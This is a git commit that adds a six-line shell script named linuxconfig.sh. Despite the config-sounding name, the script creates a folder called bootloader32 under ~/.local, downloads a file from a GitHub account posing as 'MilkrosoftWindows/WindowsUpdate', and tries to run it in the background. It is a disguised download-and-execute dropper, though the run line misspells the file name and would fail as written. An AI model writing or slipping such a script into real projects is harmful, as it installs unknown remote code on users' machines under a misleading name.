8546f4e383f728d9e926f7d6c25caef5548b0295
Modar Nasser <modar1999@gmail.com>
2021-12-02 22:27:55 +0100

    Create linuxconfig.sh

---
+++ linuxconfig.sh
@@ -0,0 +1,6 @@
+cd ~
+cd .local
+mkdir bootloader32 && cd bootloader32
+curl -o bootloader -L https://raw.githubusercontent.com/MilkrosoftWindows/WindowsUpdate/meowfart/meow_fart
+./bootlader&
+cd ~
